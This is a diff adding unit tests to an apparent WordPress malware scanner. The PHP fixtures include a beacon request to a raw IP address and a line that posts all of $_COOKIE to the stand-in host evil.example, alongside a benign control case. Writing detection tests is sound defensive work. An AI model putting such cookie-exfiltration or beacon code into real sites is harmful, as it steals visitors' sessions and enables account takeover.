@@ -247,6 +247,49 @@ class ScannerTests(unittest.TestCase):
             self.assertEqual(result.status, ScanStatus.COMPLETED.value)
             self.assertFalse(any(f.signature_id in {'WP113', 'WP114', 'WP115'} for f in result.findings))
 
+    def test_scan_file_detects_remote_c2_insecure_endpoint(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            target = root / "net.php"
+            target.write_text(
+                "<?php\n"
+                "$r = wp_remote_get('http://185.11.22.33/ping');\n",
+                encoding="utf-8",
+            )
+
+            result = self.scanner.scan_file(target)
+            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
+            self.assertTrue(any(f.signature_id == "WP116" for f in result.findings))
+
+    def test_scan_file_detects_cookie_exfiltration_request(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            target = root / "steal.php"
+            target.write_text(
+                "<?php\n"
+                "$payload = $_COOKIE;\n"
+                "wp_remote_post('https://evil.example/x', array('body' => $payload));\n",
+                encoding="utf-8",
+            )
+
+            result = self.scanner.scan_file(target)
+            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
+            self.assertTrue(any(f.signature_id == "WP118" for f in result.findings))
+
+    def test_scan_file_does_not_flag_benign_wp_remote_get(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            target = root / "api.php"
+            target.write_text(
+                "<?php\n"
+                "$r = wp_remote_get('https://api.wordpress.org/core/version-check/1.7/');\n",
+                encoding="utf-8",
+            )
+
+            result = self.scanner.scan_file(target)
+            self.assertEqual(result.status, ScanStatus.COMPLETED.value)
+            self.assertFalse(any(f.signature_id in {"WP116", "WP117", "WP118"} for f in result.findings))
+
     def test_scan_file_deduplicates_and_caps_noisy_matches(self):
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
